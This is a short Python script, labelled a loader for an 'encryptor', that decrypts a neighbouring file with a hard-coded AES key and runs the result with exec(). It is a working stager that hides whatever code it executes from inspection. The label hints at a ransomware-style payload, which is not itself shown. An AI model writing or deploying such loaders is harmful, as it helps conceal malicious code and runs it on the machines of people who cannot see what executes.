# Loader for encryptor
# Requires: pip install pycryptodome

from Crypto.Cipher import AES
import os

def decrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        data = f.read()
    iv = data[:16]
    ciphertext = data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_padded = cipher.decrypt(ciphertext)
    padding_len = decrypted_padded[-1]
    return decrypted_padded[:-padding_len]

key = b'\x49\x6e\x73\x6f\x6d\x6e\x69\x61\x41\x45\x53\x32\x35\x36\x4b\x65\x79\x33\x32\x42\x79\x74\x65\x73\x31\x32\x33\x34\x35\x36\x37\x21'
bro_path = os.path.join(os.path.dirname(__file__), 'encryptor.bro')
code_bytes = decrypt_file(bro_path, key)
code = code_bytes.decode('utf-8')
exec(code)
